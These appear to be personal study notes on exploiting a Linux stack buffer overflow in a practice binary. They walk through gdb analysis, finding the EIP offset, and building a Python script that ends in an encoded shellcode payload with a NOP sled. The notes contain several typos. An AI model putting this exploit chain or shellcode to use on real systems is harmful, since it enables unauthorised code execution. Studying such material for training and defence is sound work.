Start with static analysis 
-strings "func"-













******** Linux Exploit Development ***********

1 #Static Analysis
2 strings <program> | head 
3 file <program> ( verify file type)
4
5 ##Behavioral Analysis##
6 chmod u+x <program>
7 
8 # Dynamic Analysis
9 ## Fuzzing
10 ./func $(echo "12345678") using command substitution, however this does not work because it is not a parameter
11 
12 ./func <<<$(echo "123345678") The gators are simulating user input.
13 
14 ## Disassembly
15 gdb ./func (gbd is debugger)
16 shell > exit
17 quit #break out of gbd
18
19 info functions
20
21 run or start
22
23 diass or pdisass main # pdisass other functions (if you find function in red they have a higher likelyhood of being vulnerable)
24
25 ## Make script ##
26 touch <name>.py
27 vim <name>.py
28  #!/usr/bin/env python
offset = "A" * 100
print(offset)

29 #IN GBD#
  file ./<file) ****specify file youre using*****
30 run <<<$(python script.py)
31  
32 go to wiremask.eu, then go to tools, buffer offerflow pattern generator
33  comment out offset and insert EIP value you got from result into wiremask(find the offset)
34 copy the offset value into original first offset replacing the "100" and commenting out the offset for wiremask
35 add new line for value eip, eip = "BBBB") so script should look like this now:

#!/usr/bin/env python
offset = "A" * 62
eip = "BBBB"
#offset = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
print(offset+eip)

36 EIP should now show the new value "EIP: 0x42424242 ('BBBB')"
37 
38##Setup GBD environment###
shell
env - gdb ./func
show env
unset env COLUMNS
unset env LINES
run and ctrl+c or start

39 info proc map 
40
41
42
43
44
45
46 the bad bytes come from google. 
47

offset = "A" * 62
eip = "\x59\x3b\xde\xf7"
nop = "\x90" * 15
buf =  b""
buf += b"\xba\x39\x24\xa4\x57\xd9\xc2\xd9\x74\x24\xf4\x5e"
buf += b"\x29\xc9\xb1\x0b\x31\x56\x14\x83\xc6\x04\x03\x56"
buf += b"\x10\xdb\xd1\xce\x5c\x43\x83\x5d\x05\x1b\x9e\x02"
buf += b"\x40\x3c\x88\xeb\x21\xaa\x49\x9c\xea\x48\x23\x32"
buf += b"\x7c\x6f\xe1\x22\x79\x6f\x06\xb3\xf1\x07\x69\xd2"
buf += b"\x90\xbe\x75\x43\x38\xc9\x97\xa6\x3e"
print(offset+eip+nop+buf)
